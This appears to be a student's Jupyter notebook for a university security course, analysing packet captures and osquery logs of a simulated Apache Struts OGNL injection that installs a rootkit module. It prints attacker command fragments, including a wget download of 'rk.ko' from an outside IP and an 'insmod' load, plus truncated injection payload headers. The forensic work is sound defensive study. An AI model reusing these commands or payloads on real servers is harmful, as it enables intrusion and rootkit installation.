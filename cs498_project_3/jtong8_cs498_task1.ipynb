{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'\\nTitle: CS 498 Mini Project 3 Checkpoint 1\\nAuthor: Jiashuo Tong (jtong8), Rongqi Gao (rongqig2), Yilin Zhu (yilinz10)\\nDate Submitted: 04/13/2020\\n'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''\n",
    "Title: CS 498 Mini Project 3 Checkpoint 1\n",
    "Author: Jiashuo Tong (jtong8), Rongqi Gao (rongqig2), Yilin Zhu (yilinz10)\n",
    "Date Submitted: 04/13/2020\n",
    "'''"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Task 0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "'''\n",
    "Import Pandas and Pyshark\n",
    "'''\n",
    "import pandas as pd\n",
    "import pyshark"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 0.2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "'''\n",
    "Process pcap files into Pandas Dataframe\n",
    "'''\n",
    "\n",
    "http = pyshark.FileCapture('data files/http.pcap', keep_packets=True)\n",
    "http2 = pyshark.FileCapture('data files/http2.pcap', keep_packets=True)\n",
    "dns = pyshark.FileCapture('data files/dns.pcap', keep_packets=True)\n",
    "\n",
    "df_http = pd.DataFrame([{'sniff_time': pkt.sniff_time,\n",
    "                         'dest_ip': pkt.length,\n",
    "                         'dest_port': pkt.highest_layer\n",
    "                        } for pkt in http])\n",
    "\n",
    "df_http2 = pd.DataFrame([{'sniff_time': pkt.sniff_time,\n",
    "                          'dest_ip': pkt.length,\n",
    "                          'dest_port': pkt.highest_layer\n",
    "                         } for pkt in http2])\n",
    "\n",
    "df_dns = pd.DataFrame([{'sniff_time': pkt.sniff_time,\n",
    "                        'dest_ip': pkt.length,\n",
    "                        'dest_port': pkt.highest_layer\n",
    "                       } for pkt in dns])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 0.3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "'''\n",
    "Process Operating System Query logs into Pandas Dataframe\n",
    "'''\n",
    "from pandas import json_normalize\n",
    "oslogs = pyshark.FileCapture('data files/osqueryd.results.log', keep_packets=True)\n",
    "oslogs = open(\"data files/osqueryd.results.log\",\"r\").read()\n",
    "oslogs = oslogs.split(\"\\n\")[:-1] # Split into lines\n",
    "oslogs = [eval(oslog) for oslog in oslogs] # Build a list of dictionaries\n",
    "df_oslogs = json_normalize(oslogs) # Flatten oslogs"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 0.4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "'''\n",
    "Save dataframes to csv files\n",
    "'''\n",
    "df_http.to_csv(\"http.csv\", sep='\\t')\n",
    "df_http2.to_csv(\"http2.csv\", sep='\\t')\n",
    "df_dns.to_csv(\"dns.csv\", sep='\\t')\n",
    "df_oslogs.to_csv(\"oslogs.csv\", sep='\\t')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 0.5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "519 #cmd detected in file http.pcap!\n",
      "529 #cmd detected in file http.pcap!\n",
      "539 #cmd detected in file http.pcap!\n",
      "551 #cmd detected in file http.pcap!\n",
      "577 #cmd detected in file http.pcap!\n",
      "587 #cmd detected in file http.pcap!\n",
      "597 #cmd detected in file http.pcap!\n",
      "\n",
      "\n",
      "Which http pcap file represents legitimate activity? Which represents attacker activity?\n",
      "http.pcap' represents attacker activity, and 'http2.pcap' represents legitimate activity.\n",
      "\n",
      "\n",
      "What is the Content-Type in legitimate activity pcap file?\n",
      "Since no packets in http2.pcap has an HTTP layer, we cannot find content-type in http2.pcap.\n"
     ]
    }
   ],
   "source": [
    "for i, pkt in enumerate(http):\n",
    "    try:\n",
    "        if \"#cmd\" in str(pkt.http.content_type):\n",
    "            print(i,\"#cmd detected in file http.pcap!\")\n",
    "    except:\n",
    "        pass\n",
    "\n",
    "for i, pkt in enumerate(http2):\n",
    "    try:\n",
    "        print(pkt.http2.content_type)\n",
    "        if \"#cmd\" in str(pkt.http2.content_type):\n",
    "            print(\"#cmd detected in file http2.pcap!\")\n",
    "    except:\n",
    "        pass\n",
    "    \n",
    "print(\"\\n\")\n",
    "print(\"Which http pcap file represents legitimate activity? Which represents attacker activity?\")\n",
    "print(\"http.pcap' represents attacker activity, and 'http2.pcap' represents legitimate activity.\")\n",
    "\n",
    "print(\"\\n\")\n",
    "print(\"What is the Content-Type in legitimate activity pcap file?\")\n",
    "print(\"Since no packets in http2.pcap has an HTTP layer, we cannot find content-type in http2.pcap.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 0.6: We use 'http.pcap' for the following task"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Task 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## HTTP Traffic Analysis "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 1.1 Subtask 1.a 1.b 1.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The UNIX timestamp of the first attempted scan on the vulnerable server is  2018-03-18 12:41:43.610774\n",
      "The IP address of the vulnerable server is  172.17.0.2\n",
      "The port of the vulnerable server is  8080\n"
     ]
    }
   ],
   "source": [
    "for i, pkt in enumerate(http):\n",
    "    try:\n",
    "        if str(pkt.http.request_uri) == \"/showcase.action\":\n",
    "            print(\"The UNIX timestamp of the first attempted scan on the vulnerable server is \", pkt.sniff_time)\n",
    "            print(\"The IP address of the vulnerable server is \", pkt.ip.dst)\n",
    "            print(\"The port of the vulnerable server is \", pkt.tcp.dstport)\n",
    "            break\n",
    "    except:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "###  Task 1.2 Subtask 2.a 2.b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>index</th>\n",
       "      <th>sniff_time</th>\n",
       "      <th>content_type</th>\n",
       "      <th>len_content_type</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>407</td>\n",
       "      <td>2018-03-18 12:43:10.853758</td>\n",
       "      <td>.multipart/form-data~${#context[\"com.opensymph...</td>\n",
       "      <td>144</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>423</td>\n",
       "      <td>2018-03-18 12:43:15.819160</td>\n",
       "      <td>.multipart/form-data~${#context[\"com.opensymph...</td>\n",
       "      <td>144</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>439</td>\n",
       "      <td>2018-03-18 12:43:20.997805</td>\n",
       "      <td>.multipart/form-data~${#context[\"com.opensymph...</td>\n",
       "      <td>144</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>519</td>\n",
       "      <td>2018-03-18 12:44:21.490042</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>806</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>529</td>\n",
       "      <td>2018-03-18 12:44:33.060337</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>810</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>539</td>\n",
       "      <td>2018-03-18 12:45:09.142614</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>845</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>551</td>\n",
       "      <td>2018-03-18 12:45:22.848523</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>845</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>577</td>\n",
       "      <td>2018-03-18 12:45:47.160066</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>818</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>587</td>\n",
       "      <td>2018-03-18 12:46:02.837276</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>818</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>597</td>\n",
       "      <td>2018-03-18 12:46:03.444769</td>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>818</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   index                 sniff_time  \\\n",
       "0    407 2018-03-18 12:43:10.853758   \n",
       "1    423 2018-03-18 12:43:15.819160   \n",
       "2    439 2018-03-18 12:43:20.997805   \n",
       "3    519 2018-03-18 12:44:21.490042   \n",
       "4    529 2018-03-18 12:44:33.060337   \n",
       "5    539 2018-03-18 12:45:09.142614   \n",
       "6    551 2018-03-18 12:45:22.848523   \n",
       "7    577 2018-03-18 12:45:47.160066   \n",
       "8    587 2018-03-18 12:46:02.837276   \n",
       "9    597 2018-03-18 12:46:03.444769   \n",
       "\n",
       "                                        content_type  len_content_type  \n",
       "0  .multipart/form-data~${#context[\"com.opensymph...               144  \n",
       "1  .multipart/form-data~${#context[\"com.opensymph...               144  \n",
       "2  .multipart/form-data~${#context[\"com.opensymph...               144  \n",
       "3  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...               806  \n",
       "4  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...               810  \n",
       "5  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...               845  \n",
       "6  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...               845  \n",
       "7  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...               818  \n",
       "8  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...               818  \n",
       "9  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...               818  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dict_keys(['whoami', 'wget', 'ls', 'insmod']) are present in content type headers.\n"
     ]
    }
   ],
   "source": [
    "df_ct = []\n",
    "for i, pkt in enumerate(http):\n",
    "    try:\n",
    "        if str(pkt.http.request_uri) == \"/showcase.action\":\n",
    "            df_ct.append({'index': i,\n",
    "                      'sniff_time': pkt.sniff_time,\n",
    "                      'content_type': pkt.http.content_type,\n",
    "                      'len_content_type': len(str(pkt.http.content_type))}\n",
    "                    )\n",
    "    except:\n",
    "        pass\n",
    "df_ct = pd.DataFrame(df_ct)\n",
    "display(df_ct)\n",
    "\n",
    "from collections import defaultdict\n",
    "present = defaultdict(list)\n",
    "for keyword in [\"whoami\", \"wget\", \"ls\", \"cat\", \"cd\", \"insmod\", \"ssh\", \"lsmod\"]:\n",
    "    for i in range(len(df_ct.content_type)):\n",
    "        if keyword in df_ct.content_type.iloc[i]:\n",
    "            present[keyword].append(i)\n",
    "\n",
    "print(present.keys(), \"are present in content type headers.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Host Logs Analysis "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Provide a list of kernel modules added or removed from the system"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>action</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>rk</td>\n",
       "      <td>added</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>43</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ipt_MASQUERADE</td>\n",
       "      <td>added</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>44</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>nf_nat_masquerade_ipv4</td>\n",
       "      <td>added</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>45</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>nf_conntrack_netlink</td>\n",
       "      <td>added</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>46</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>nfnetlink</td>\n",
       "      <td>added</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2339</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>nfnetlink_queue</td>\n",
       "      <td>added</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2340</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>nfnetlink_log</td>\n",
       "      <td>added</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2341</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>bluetooth</td>\n",
       "      <td>added</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2882</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>rk</td>\n",
       "      <td>added</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2883</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>rk</td>\n",
       "      <td>removed</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>303 rows × 3 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "               name            columns.name   action\n",
       "42    kernel_module                      rk    added\n",
       "43    kernel_module          ipt_MASQUERADE    added\n",
       "44    kernel_module  nf_nat_masquerade_ipv4    added\n",
       "45    kernel_module    nf_conntrack_netlink    added\n",
       "46    kernel_module               nfnetlink    added\n",
       "...             ...                     ...      ...\n",
       "2339  kernel_module         nfnetlink_queue    added\n",
       "2340  kernel_module           nfnetlink_log    added\n",
       "2341  kernel_module               bluetooth    added\n",
       "2882  kernel_module                      rk    added\n",
       "2883  kernel_module                      rk  removed\n",
       "\n",
       "[303 rows x 3 columns]"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_oslogs[df_oslogs.name == \"kernel_module\"][[\"name\",\"columns.name\",\"action\"]]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Identify the attacker-controlled kernel module"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " http://162.212.156.148/rk.ko > rk.ko\n",
      " http://162.212.156.148/rk.ko > rk.ko\n",
      " rk.ko\n",
      " rk.ko\n",
      " rk.ko\n",
      "The attacker-controlled module is rk.ko\n"
     ]
    }
   ],
   "source": [
    "import re # Use regular expression for searching the attacker-controlled module\n",
    "\n",
    "for i in range(len(df_ct.content_type)):\n",
    "    try:\n",
    "        print(re.search(' .*.ko', df_ct.content_type.iloc[i]).group(0))\n",
    "    except:\n",
    "        pass\n",
    "\n",
    "print(\"The attacker-controlled module is rk.ko\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Verify that the kernel module that the attacker obtained in Task 1.2 has been loaded into the vulnerable server. How did you verify that the module was loaded onto the server?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The module was loaded onto the server because the following command is run:\n",
      "#cmd='insmod rk.ko.1'\n",
      "Also, from df_oslogs, we identify the following items:\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>action</th>\n",
       "      <th>calendarTime</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>rk</td>\n",
       "      <td>added</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>113</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>rk</td>\n",
       "      <td>removed</td>\n",
       "      <td>Tue Feb  6 00:34:50 2018 UTC</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2882</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>rk</td>\n",
       "      <td>added</td>\n",
       "      <td>Mon Mar 19 15:58:54 2018 UTC</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2883</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>rk</td>\n",
       "      <td>removed</td>\n",
       "      <td>Mon Mar 19 15:58:58 2018 UTC</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "               name columns.name   action                  calendarTime\n",
       "42    kernel_module           rk    added  Tue Feb  6 00:34:09 2018 UTC\n",
       "113   kernel_module           rk  removed  Tue Feb  6 00:34:50 2018 UTC\n",
       "2882  kernel_module           rk    added  Mon Mar 19 15:58:54 2018 UTC\n",
       "2883  kernel_module           rk  removed  Mon Mar 19 15:58:58 2018 UTC"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "print(\"The module was loaded onto the server because the following command is run:\")\n",
    "for i in range(len(df_ct.content_type)):\n",
    "    try:\n",
    "        print(re.search(\"(#cmd='insmod rk.ko.1')\", df_ct.content_type.iloc[i]).group(0))\n",
    "        break\n",
    "    except:\n",
    "        pass\n",
    "    \n",
    "print(\"Also, from df_oslogs, we identify the following items:\")\n",
    "df_oslogs[(df_oslogs[\"columns.name\"]==\"rk\") & (df_oslogs.name==\"kernel_module\")][[\"name\",\"columns.name\",\"action\", \"calendarTime\"]]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### What is the file name that contains the internal hostnames?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The file name that contains the internal hostnames is 'known_hosts'\n"
     ]
    }
   ],
   "source": [
    "df_oslogs[df_oslogs[\"columns.target_path\"].fillna(\"\").str.contains(\".ssh\") &\n",
    "          df_oslogs[\"columns.target_path\"].fillna(\"\").str.contains(\"host\")][\"columns.target_path\"].unique()\n",
    "\n",
    "print(\"The file name that contains the internal hostnames is 'known_hosts'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Do you observe any evidence that the attacker extracted the internal host names via HTTP in the logs? If yes report the log line. If not briefly explain why not."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From the HTTP content type headers, we have found nothing related to the internal hostname file. Therefore, we conclude that the attacker is not using HTTP to access the file with internal hostnames.\n"
     ]
    }
   ],
   "source": [
    "for i, pkt in enumerate(http):\n",
    "    try:\n",
    "        if \"known_hosts\" in pkt.http.content_type:\n",
    "            print(\"Identified file extraction via HTTP\");\n",
    "    except:\n",
    "        pass\n",
    "\n",
    "print(\"From the HTTP content type headers, we have found nothing related to the internal hostname file. Therefore, we conclude that the attacker is not using HTTP to access the file with internal hostnames.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "###  Task 1.3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Identify the attacker-controlled DNS server and the legitimate DNS server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "wget http://162.212.156.148/rk.ko > rk.ko \n",
      "\n",
      "From the content type headers, we find the IP address '162.212.156.148' following wget. Therefore, the attacker-controlled server is 162.212.156.148.\n"
     ]
    }
   ],
   "source": [
    "import re # Use regular expression for searching the attacker-controlled module\n",
    "\n",
    "for i in range(len(df_ct.content_type)):\n",
    "    try:\n",
    "        print(re.search('wget .* rk.ko', df_ct.content_type.iloc[i]).group(0),\"\\n\")\n",
    "        break\n",
    "    except:\n",
    "        pass\n",
    "\n",
    "print(\"From the content type headers, we find the IP address '162.212.156.148' following wget. Therefore, the attacker-controlled server is 162.212.156.148.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The attacker server should frequently communicate with the legitimate server for malicious purposes. Therefore, we can identify the legitimate server by finding the source IP when destination IP is 162.212.156.148.\n",
      "\n",
      "The legitimate server is  10.0.2.15\n"
     ]
    }
   ],
   "source": [
    "print(\"The attacker server should frequently communicate with the legitimate server for malicious purposes. Therefore, we can identify the legitimate server by finding the source IP when destination IP is 162.212.156.148.\\n\")\n",
    "for pkt in dns:\n",
    "    if str(pkt.ip.dst_host) == \"162.212.156.148\":\n",
    "        print(\"The legitimate server is \", str(pkt.ip.src))\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Plot a distribution of the length of DNS queries to the two DNS servers on the same plot."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "lengths_to_legitimate = [] # Array of lengths of queries with the legitimate server as the destination\n",
    "lengths_to_attacker = [] # Array of lengths of queries with the attacker-controlled server as the destination\n",
    "\n",
    "for pkt in dns:\n",
    "    if str(pkt.ip.dst_host) == \"162.212.156.148\":\n",
    "        lengths_to_attacker.append(int(pkt.length))\n",
    "    elif str(pkt.ip.dst_host) == \"10.0.2.15\":\n",
    "        lengths_to_legitimate.append(int(pkt.length))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.legend.Legend at 0x1d7f91c5b80>"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 864x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "\n",
    "bins_attacker = range(min(lengths_to_attacker),max(lengths_to_attacker), 50)\n",
    "bins_legitimate = range(min(lengths_to_legitimate),max(lengths_to_legitimate),50)\n",
    "\n",
    "fig, ax = plt.subplots(nrows=1, ncols=1, figsize=(12,8))\n",
    "ax.hist(lengths_to_legitimate, bins=bins_legitimate, alpha=0.5, label='To legitimate DNS server')\n",
    "ax.hist(lengths_to_attacker, bins=bins_attacker, alpha=0.5, label='To attacker-controlled DNS server')\n",
    "ax.set_title(\"Histogram of the Lengths of DNS Queries to Legitimate And Attacker DNS servers\", fontsize=14)\n",
    "ax.set_xlabel(\"Length of Queries\", fontsize=12)\n",
    "ax.set_ylabel(\"Frequency\", fontsize=12)\n",
    "ax.legend(loc='upper right', fontsize=12)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
